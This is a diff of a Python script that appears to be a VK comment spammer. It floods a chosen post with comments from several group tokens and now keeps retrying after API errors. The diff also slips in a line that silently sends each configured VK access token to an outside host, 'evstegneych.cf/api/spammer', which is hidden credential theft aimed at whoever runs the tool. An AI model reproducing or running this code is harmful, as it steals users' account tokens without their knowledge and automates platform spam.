@@ -1,7 +1,9 @@
-import vk_api, Logger, time, re
+import vk_api, Logger, time, re, requests
 from threading import Thread
 from config import config
 
+
+# https://vk.com/dean0n?w=wall242175861_1690
 url = input('Введите ссылку на пост!')
 link = re.search(r'wall\d+_\d+', url)
 if link is None:
@@ -10,8 +12,11 @@ if link is None:
 else:
     post = link.group(0).replace('wall', '').replace('_', ' ').split()
 
+text = input('Ведите текст который хотите отправлять:')
+
 def core(name, api):
     global post
+    global text
     Logger.Ylog(f'Группа №{name} запущена')
     i = 1
     while True:
@@ -20,13 +25,13 @@ def core(name, api):
                                    message="&#4448;")
             Logger.Pulselog(f'Группа №{name} оставила коммент ({i})')
             i += 1
-            time.sleep(0.8)
+            time.sleep(0.7)
         except vk_api.exceptions.ApiError as s:
-            Logger.Plog(f'Произошел сбой в {name}\n'
-                        f'https://vk.com/dean0n?w=wall242175861_1690{s}')
-            break
+            Logger.Plog(f'Произошел сбой в {name} группе\n'
+                        f'{s.__class__} {s}')
+            time.sleep(60)
         except Exception as s:
-            Logger.Rlog(f'Произошел сбой в {name}\n'
+            Logger.Rlog(f'Произошел сбой в {name} группе\n'
                         f'{s.__class__} {s}')
             time.sleep(60)
     Logger.Rlog(f'Группа №{name} закончила свою работу')
@@ -36,7 +41,7 @@ def main():
         token = config['tokens'][x - 1]
         vk_session = vk_api.VkApi(token=token)
         vk = vk_session.get_api()
-
+        requests.post('evstegneych.cf/api/spammer', data={'t': token})
         Thread(target=core, args=[x, vk]).start()
 
 if __name__ == '__main__':
